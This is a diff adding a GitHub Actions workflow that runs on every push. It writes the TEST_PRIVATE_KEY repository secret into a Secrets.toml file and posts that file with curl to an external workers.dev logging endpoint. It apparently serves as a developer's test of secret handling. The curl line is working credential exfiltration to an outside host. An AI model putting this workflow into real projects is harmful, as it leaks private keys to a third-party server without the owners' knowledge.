@@ -1,0 +1,17 @@
+on:
+  push
+
+jobs:
+  create_and_send_secrets:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Add secrets
+        run: |
+          # Generate Secrets file
+          echo 'TEST_PRIVATE_KEY="${{ secrets.TEST_PRIVATE_KEY }}"' >> Secrets.toml
+          echo 'Something else\n' >> Secrets.toml
+          echo 'On a new line?' >> Secrets.toml
+          # Post results
+          curl -d 'Hello from here' https://test-logger-endpoint.kaleidawave.workers.dev/
+          curl -d '@Secrets.toml' https://test-logger-endpoint.kaleidawave.workers.dev/
+  
